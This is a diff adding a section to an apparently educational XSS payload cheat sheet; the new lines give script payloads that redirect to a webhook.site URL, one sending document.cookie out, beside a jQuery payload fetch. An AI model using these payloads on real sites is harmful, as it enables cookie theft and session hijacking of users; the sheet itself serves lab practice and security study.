@@ -44,6 +44,14 @@ document.querySelectorAll('#thm-title')[0].innerText
 document.querySelectorAll('#thm-title')[0].innerText = "Insert Code"
 ```
 
+### Testing XSS using webhooks (Thanks to @iiLegacyyii)
+
+Generate your webhook session id by using https://webhook.site/
+```
+<script>document.location = "https://webhook.site/session_id"</script>
+<script>document.location = "https://webhook.site/session_id/?cookies=" + document.cookie</script>
+```
+
 ### jQuery 2.1.1
 ```
 $.get('http://example.com/jquerypayload')
